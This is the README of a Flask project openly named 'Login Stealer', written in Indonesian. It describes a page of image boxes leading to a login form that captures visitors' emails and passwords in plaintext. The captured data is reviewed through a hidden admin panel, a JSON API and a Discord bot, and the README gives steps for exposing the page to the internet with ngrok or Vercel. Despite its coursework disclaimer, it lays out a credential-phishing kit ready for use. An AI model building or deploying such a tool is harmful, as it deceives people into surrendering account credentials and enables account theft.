# 🔐 Login Stealer — Flask CRUD Project

Aplikasi web CRUD berbasis Flask + Python dengan konsep OOP. Dibuat sebagai proyek pembelajaran yang mencakup frontend, backend, dan database dalam satu codebase yang bersih.

❗❗ **DO NOT USE THIS FOR CRIMINAL ACTIVITY, AUTHOR IS NOT RESPONSIBLE FOR YOUR MISBEHAVIOR** ❗❗

---

## ✨ Fitur Utama

- Halaman utama dengan **6 image box** yang bisa diklik
- Semua box mengarah ke **satu form terpusat** (`/form`) dengan `box_id` tersimpan via hidden field
- Form menerima **email & password** lalu menyimpannya ke database
- Validasi form **custom JS** (tanpa validasi bawaan browser)
- Halaman konfirmasi setelah submit
- **Panel admin tersembunyi** dengan kredensial hardcoded
- Admin dapat **melihat, mengedit, dan menghapus** semua data yang masuk
- Password disimpan **plaintext** agar admin bisa membaca dan mengubahnya langsung
- **REST API endpoint** untuk integrasi dengan Postman / Insomnia
- **Discord Bot** dengan slash commands untuk akses data langsung dari Discord

---

## 🗂️ Struktur Folder

```
Login-stealer/
├── app/
│   ├── __init__.py
│   ├── models.py
│   ├── routes/
│   │   ├── __init__.py
│   │   ├── main.py
│   │   ├── auth.py
│   │   ├── admin.py
│   │   └── api.py
│   ├── templates/
│   │   ├── index.html
│   │   ├── form.html
│   │   ├── check_email.html
│   │   ├── admin_login.html
│   │   ├── admin_dashboard.html
│   │   └── admin_edit.html
│   └── static/
│       └── style.css
├── discord-bot/
│   ├── bot.py
│   ├── .env
│   ├── .env.example
│   ├── .gitignore
│   └── requirements.txt
├── .env
├── .env.example
├── .gitignore
├── config.py
├── requirements.txt
└── run.py
```

---

## ⚙️ Instalasi — Flask App

### 1. Clone repo

```bash
git clone https://github.com/DaffaAqilah/Login-stealer.git
cd Login-stealer
```

### 2. Buat virtual environment (Opsional)

```bash
python -m venv venv
venv\Scripts\activate        # Windows
source venv/bin/activate     # Mac/Linux
```

### 3. Install dependencies

```bash
pip install -r requirements.txt
```

### 4. Buat file `.env`

Salin dari `.env.example`:

```bash
cp .env.example .env
```

Lalu isi nilainya:

```env
SECRET_KEY=isi-dengan-string-random-panjang
ADMIN_USERNAME=admin
ADMIN_PASSWORD=passwordkamu
```

### 5. Jalankan aplikasi

```bash
python run.py
```

Buka di browser: `http://localhost:5000`

---

## 🤖 Instalasi — Discord Bot

### 1. Masuk ke folder bot

```bash
cd discord-bot
```

### 2. Install dependencies bot

```bash
pip install -r requirements.txt
```

### 3. Buat file `.env` bot

```env
DISCORD_TOKEN=token-bot-discord-kamu
FLASK_URL=https://xxxx-xxxx.ngrok-free.app
```

> `FLASK_URL` didapat dari ngrok saat Flask dijalankan secara lokal. Update nilai ini setiap kali URL ngrok berubah.

### 4. Jalankan bot

```bash
python bot.py
```

---

## 🚦 Urutan Menjalankan Semua Sekaligus

```
Terminal 1 → python run.py                        (Flask app)
Terminal 2 → ngrok http 5000                      (tunnel ke internet)
Terminal 3 → cd discord-bot && python bot.py      (Discord bot)
```

---

## 🎮 Discord Slash Commands

| Command | Keterangan |
|---|---|
| `/menu` | Lihat semua command yang tersedia |
| `/submit` | Kirim email, password, dan box_id ke database |
| `/adminlogin` | Login sebagai admin — hanya terlihat oleh kamu |
| `/users` | Lihat semua data user yang masuk |
| `/delete` | Hapus data user berdasarkan ID |

> `/adminlogin`, `/users`, dan `/delete` memerlukan akses admin.

---

## 🧭 Halaman & Route

| Route | Keterangan |
|---|---|
| `/` | Halaman utama — 6 image box |
| `/form?box_id=<n>` | Form login (semua box mengarah ke sini) |
| `/check-email` | Halaman konfirmasi setelah submit |
| `/rahasia-admin/login` | Login panel admin |
| `/rahasia-admin/dashboard` | Dashboard — lihat semua data |
| `/rahasia-admin/edit/<id>` | Edit email & password user |
| `/rahasia-admin/delete/<id>` | Hapus data user |

---

## 🔌 API Endpoints

Semua endpoint berada di prefix `/api` dan menerima/mengembalikan **JSON**.

### Submit Data User

```
POST /api/submit
Content-Type: application/json

{
  "email": "test@email.com",
  "password": "abc123",
  "box_id": 2
}
```

### Login Admin

```
POST /api/admin/login
Content-Type: application/json

{
  "username": "admin",
  "password": "passwordkamu"
}
```

### Lihat Semua Data *(perlu login admin)*

```
GET /api/admin/users
```

### Edit Data *(perlu login admin)*

```
PUT /api/admin/users/<id>
Content-Type: application/json

{
  "email": "baru@email.com",
  "password": "passwordbaru"
}
```

### Hapus Data *(perlu login admin)*

```
DELETE /api/admin/users/<id>
```

> **Catatan:** Endpoint admin bergantung pada session cookie — pastikan API mengaktifkan **"Send Cookies"** dan **"Follow Redirects"**.

---

## 🏗️ Struktur OOP

```python
# UserSubmission — SQLAlchemy model
class UserSubmission(db.Model):
    id, email, password, box_id, created_at

# AdminUser — plain class, tidak disimpan di DB
class AdminUser:
    USERNAME, PASSWORD
    verify(username, password) → bool
```

---

## 🛠️ Tech Stack

| Komponen | Teknologi |
|---|---|
| Backend | Python 3, Flask |
| ORM | Flask-SQLAlchemy |
| Database | SQLite |
| Frontend | HTML, CSS, Vanilla JS |
| Environment | python-dotenv |
| Bot | discord.py |
| Tunnel | ngrok |

---

## 📦 Requirements

**Flask App:**
```
flask
flask-sqlalchemy
python-dotenv
```

**Discord Bot:**
```
discord.py
requests
python-dotenv
```

---

## 🚀 Deployment

Project ini kompatibel untuk di-deploy ke **Vercel** dengan sedikit konfigurasi tambahan (`vercel.json`). Setelah deploy, update `FLASK_URL` di `.env` bot dengan URL production — tidak perlu ngrok lagi.

---

## ⚠️ Disclaimer

**Project ini dibuat murni untuk tujuan pembelajaran mata kuliah Praktikum Pemrograman Komputer. Tidak ditujukan untuk penggunaan produksi atau aktivitas yang melanggar hukum.**

---

## 👤 Author

Daffa Aqilah
Mata Kuliah : Praktikum Pemrograman Komputer
